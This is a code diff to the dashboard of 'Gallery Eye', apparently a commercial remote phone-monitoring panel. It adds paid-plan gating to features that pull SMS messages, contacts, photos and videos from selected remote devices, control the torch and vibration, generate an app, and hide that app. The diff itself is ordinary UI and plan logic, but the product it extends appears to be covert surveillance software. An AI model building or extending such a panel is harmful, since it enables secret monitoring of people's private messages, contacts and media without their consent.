@@ -1,21 +1,41 @@
 "use client";
 
 import { useSession, signOut } from "next-auth/react";
-import { useState, useEffect, useRef, useMemo } from "react";
-import { Lock, Zap, Smartphone, Settings, Wand2 } from 'lucide-react';
+import { useEffect, useState, useMemo } from "react";
 import Image from "next/image";
 import io from "socket.io-client";
 import AppGenerationModal from "@/components/AppGenerationModal";
 import WhatsAppButton from "@/components/WhatsAppButton";
+import PlanBadge from "@/components/PlanBadge";
+import UpgradeModal from "@/components/UpgradeModal";
 
 let socket: any;
 
-// ... (imports remain same)
+// Plan limits type
+interface PlanLimits {
+    photos: number;
+    videos: number;
+    sms: boolean;
+    contacts: boolean;
+    torch: boolean;
+    vibration: boolean;
+    hideApp: boolean;
+    bulkDownload?: boolean;
+}
 
 export default function Home() {
     const { data: session, status } = useSession();
     const [images, setImages] = useState<any[]>([]);
     const [folders, setFolders] = useState([]);
+
+    // Plan State
+    const [userPlan, setUserPlan] = useState<'basic' | 'standard' | 'premium'>('basic');
+    const [planLimits, setPlanLimits] = useState<PlanLimits>({
+        photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, hideApp: false
+    });
+    const [showUpgradeModal, setShowUpgradeModal] = useState(false);
+    const [upgradeFeature, setUpgradeFeature] = useState('');
+    const [requiredPlan, setRequiredPlan] = useState<'standard' | 'premium'>('standard');
 
     // Multi-Device State
     const [devices, setDevices] = useState<any[]>([]);
@@ -40,14 +60,10 @@ export default function Home() {
     const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);
 
     // Torch State
-    const [torchState, setTorchState] = useState(false);
-
-    // Check Plan
-    const userPlan = (session?.user as any)?.plan || 'basic';
+    const [isTorchOn, setIsTorchOn] = useState(false);
     const [torchAggressive, setTorchAggressive] = useState(false);
     const [torchDuration, setTorchDuration] = useState(60000); // 1 minute default
 
-    // Vibration State
     // Vibration State
     const [vibrationDuration, setVibrationDuration] = useState(1000); // 1 second default
 
@@ -69,6 +85,29 @@ export default function Home() {
     const [isSettingsOpen, setIsSettingsOpen] = useState(false);
     const [devicePermissions, setDevicePermissions] = useState<any>(null);
     const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
+
+    // Helper function to show upgrade modal
+    const showUpgradePrompt = (feature: string, required: 'standard' | 'premium') => {
+        setUpgradeFeature(feature);
+        setRequiredPlan(required);
+        setShowUpgradeModal(true);
+    };
+
+    // Fetch user plan on authentication
+    useEffect(() => {
+        if (status === "authenticated" && session?.user?.uuid) {
+            fetch(`https://backend-api-gallery.onrender.com/user/plan?uuid=${session.user.uuid}`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.plan) {
+                        setUserPlan(data.plan);
+                        setPlanLimits(data.limits);
+                    }
+                })
+                .catch(e => console.error('[Plan] Fetch error:', e));
+        }
+    }, [status, session]);
+
     useEffect(() => {
         if (status === "authenticated" && session?.user?.uuid) {
             const uuid = session.user.uuid;
@@ -193,6 +232,11 @@ export default function Home() {
 
     // SMS Functions
     const fetchSms = () => {
+        // Plan check - SMS requires Standard or Premium
+        if (!planLimits.sms) {
+            showUpgradePrompt('SMS Access', 'standard');
+            return;
+        }
         if (socket && selectedDeviceId && session?.user?.uuid) {
             setIsFetchingSms(true);
             socket.emit("get_sms", {
@@ -216,6 +260,11 @@ export default function Home() {
 
     // Contacts Functions
     const fetchContacts = () => {
+        // Plan check - Contacts requires Standard or Premium
+        if (!planLimits.contacts) {
+            showUpgradePrompt('Contacts Access', 'standard');
+            return;
+        }
         if (socket && selectedDeviceId && session?.user?.uuid) {
             setIsFetchingContacts(true);
             socket.emit("get_contacts", {
@@ -294,13 +343,18 @@ export default function Home() {
 
     // --- Torch Functions ---
     const toggleTorch = () => {
+        // Plan check - Torch requires Standard or Premium
+        if (!planLimits.torch) {
+            showUpgradePrompt('Flashlight Control', 'standard');
+            return;
+        }
         if (!socket || !selectedDeviceId || !session?.user?.uuid) {
             alert("Please select an online device first.");
             return;
         }
 
-        const newState = !torchState;
-        setTorchState(newState);
+        const newState = !isTorchOn;
+        setIsTorchOn(newState);
 
         socket.emit("torch_control", {
             uuid: session.user.uuid,
@@ -313,6 +367,11 @@ export default function Home() {
 
     // --- Vibration Functions ---
     const triggerVibration = () => {
+        // Plan check - Vibration requires Standard or Premium
+        if (!planLimits.vibration) {
+            showUpgradePrompt('Vibration Control', 'standard');
+            return;
+        }
         if (!socket || !selectedDeviceId || !session?.user?.uuid) {
             alert("Please select an online device first.");
             return;
@@ -516,6 +575,7 @@ END:VCARD`;
                             <svg className="w-5 h-5 md:w-6 md:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                         </button>
                         <span className="text-lg md:text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-white to-white/60 hidden sm:block">Gallery Eye</span>
+                        <PlanBadge plan={userPlan} />
                     </div>
 
                     <div className="flex items-center gap-2 md:gap-4">
@@ -809,9 +869,9 @@ END:VCARD`;
                                 <button
                                     onClick={toggleTorch}
                                     disabled={!selectedDeviceId}
-                                    className={`w-16 h-8 rounded-full transition-colors relative ${torchState ? 'bg-yellow-500' : 'bg-white/20'}`}
+                                    className={`w-16 h-8 rounded-full transition-colors relative ${isTorchOn ? 'bg-yellow-500' : 'bg-white/20'}`}
                                 >
-                                    <div className={`w-6 h-6 bg-white rounded-full absolute top-1 transition-transform shadow-lg ${torchState ? 'left-9' : 'left-1'}`} />
+                                    <div className={`w-6 h-6 bg-white rounded-full absolute top-1 transition-transform shadow-lg ${isTorchOn ? 'left-9' : 'left-1'}`} />
                                 </button>
                             </div>
 
@@ -900,30 +960,6 @@ END:VCARD`;
                     <>
                         <div className="flex flex-col md:flex-row md:items-center justify-between mb-6 gap-4">
                             <h2 className="text-2xl font-bold">Your Gallery</h2>
-
-                            {/* Tools Section */}
-                            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 p-4">
-                                <button
-                                    onClick={() => socket?.emit('torch_control', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, on: !torchState, aggressive: false })}
-                                    disabled={userPlan === 'basic'}
-                                    className={`p-4 rounded-xl flex items-center justify-center gap-2 font-bold transition-all ${userPlan === 'basic' ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed' :
-                                        torchState ? 'bg-yellow-500 text-black' : 'bg-zinc-800 hover:bg-zinc-700'
-                                        }`}
-                                >
-                                    {userPlan === 'basic' ? <Lock className="w-4 h-4" /> : (torchState ? <Zap className="w-4 h-4 text-black" /> : <Zap className="w-4 h-4" />)}
-                                    {userPlan === 'basic' ? 'Torch (Std)' : (torchState ? 'Torch ON' : 'Torch OFF')}
-                                </button>
-
-                                <button
-                                    onClick={() => socket?.emit('vibrate_control', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, duration: 1000 })}
-                                    disabled={userPlan === 'basic'}
-                                    className={`p-4 rounded-xl flex items-center justify-center gap-2 font-bold transition-all ${userPlan === 'basic' ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed' : 'bg-zinc-800 hover:bg-zinc-700'
-                                        }`}
-                                >
-                                    {userPlan === 'basic' ? <Lock className="w-4 h-4" /> : <Smartphone className="w-4 h-4" />}
-                                    {userPlan === 'basic' ? 'Vibrate (Std)' : 'Vibrate'}
-                                </button>
-                            </div>
 
                             {/* Tabs */}
                             <div className="flex p-1 bg-white/5 rounded-xl border border-white/10 self-start">
@@ -1342,6 +1378,7 @@ END:VCARD`;
                         onClose={() => setShowAppModal(false)}
                         uuid={session?.user?.uuid || ''}
                         socket={socket}
+                        userPlan={userPlan}
                     />
                 )}
 
@@ -1482,7 +1519,15 @@ END:VCARD`;
                         <p className="text-xs text-white/40 mt-2 text-right">{uploadProgress.uploaded} / {uploadProgress.total} items</p>
                     </div>
                 )}
+
+                {/* Upgrade Modal */}
+                <UpgradeModal
+                    isOpen={showUpgradeModal}
+                    onClose={() => setShowUpgradeModal(false)}
+                    feature={upgradeFeature}
+                    requiredPlan={requiredPlan}
+                />
             </div>
-        </main >
+        </main>
     );
 }
